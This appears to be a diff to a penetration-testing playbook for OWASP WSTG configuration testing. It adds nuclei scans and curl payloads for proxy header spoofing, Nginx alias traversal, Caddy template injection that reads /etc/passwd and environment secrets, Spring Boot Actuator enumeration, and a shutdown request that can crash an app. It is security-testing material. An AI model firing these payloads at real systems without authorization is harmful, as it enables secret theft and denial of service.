@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [misconfiguration, hardening, server, wstg, conf]
 tech_stack: [apache, nginx, iis, tomcat]
 cwe_ids: [CWE-16]
-chains_with: []
+chains_with: [wstg-conf-02, wstg-conf-04]
 prerequisites: []
-severity_boost: {}
+severity_boost:
+  wstg-conf-04: "Backup File Credential Leak + Exposed Admin Interface = Full System Takeover (Critical)"
 ---
 
 # wstg-conf-01
@@ -236,6 +237,50 @@ nuclei -u https://target.com -t cves/
 nuclei -u https://target.com -t misconfigurations/
 nuclei -u https://target.com -t default-logins/
 nuclei -u https://target.com -t exposed-panels/
+
+# Targeted checks for insecure management interfaces
+nuclei -t http/default-logins -u https://target.com     # default creds on admin panels/network devices
+nuclei -t http/exposed-panels -u https://target.com      # unauthenticated admin panels reachable
+nuclei -t http/exposures -u https://target.com           # config/credential exposures on mgmt endpoints
+```
+
+### Reverse Proxy Misconfigurations (from PayloadsAllTheThings)
+
+Reverse proxies (Nginx/Caddy/load balancers) sitting in front of the app server introduce their own class of infrastructure misconfiguration, distinct from the backend app itself:
+
+```bash
+# Client-supplied IP headers trusted by the origin (spoof source-IP-based access control / rate limiting)
+curl -s "https://{target}/admin" -H "X-Forwarded-For: 127.0.0.1"
+curl -s "https://{target}/admin" -H "X-Real-IP: 127.0.0.1"
+curl -s "https://{target}/admin" -H "True-Client-IP: 127.0.0.1"
+
+# Nginx "off-by-slash" alias traversal: a `location /path { alias /fs/path/; }` block
+# (no trailing slash on location, trailing slash on alias) lets ../ escape the alias root
+curl -s "https://{target}/styles../secret.txt"     # -> resolves to /fs/path/../secret.txt
+
+# Missing `location /` root causes any unmatched path to fall through to the global `root`,
+# potentially exposing server config files
+curl -s "https://{target}/nginx.conf"
+
+# Caddy `templates` directive template injection via reflected header (Go template syntax)
+curl -s -H 'Referer: {{readFile "/etc/passwd"}}' "https://{target}/"
+curl -s -H 'Referer: {{env "DATABASE_URL"}}' "https://{target}/"
+```
+
+Automated analysis: run `yandex/gixy` (or the maintained fork `MegaManSec/Gixy-Next`) against a leaked/recovered `nginx.conf` to statically flag alias-traversal and other Nginx misconfigurations; use `laluka/bypass-url-parser` to brute-force path-mangling bypasses against a 403-protected endpoint sitting behind the proxy.
+
+### Spring Boot Actuator Exposure
+
+```bash
+# Actuator endpoints are a common insecure management-interface finding in Java apps
+for ep in env health beans mappings configprops heapdump threaddump loggers httptrace shutdown; do
+    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/actuator/$ep")
+    echo "actuator/$ep: $status"
+done
+
+# /actuator/env can leak secrets/credentials; /actuator/heapdump can leak session tokens;
+# an exposed /actuator/shutdown (POST) can DoS the app outright
+curl -s -X POST "https://target.com/actuator/shutdown"
 ```
 
 ---
@@ -326,6 +371,9 @@ Variable based on findings. Common scenarios:
 - [OWASP WSTG - Test Network Infrastructure](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration)
 - [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)
 - [NIST Checklist Program](https://nvd.nist.gov/ncp/repository)
+- [PayloadsAllTheThings - Insecure Management Interface](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Management%20Interface)
+- [Exploiting Spring Boot Actuators - Veracode](https://web.archive.org/web/20250116045001/https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
+- [PayloadsAllTheThings - Reverse Proxy Misconfigurations](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Reverse%20Proxy%20Misconfigurations)
 
 
 ---
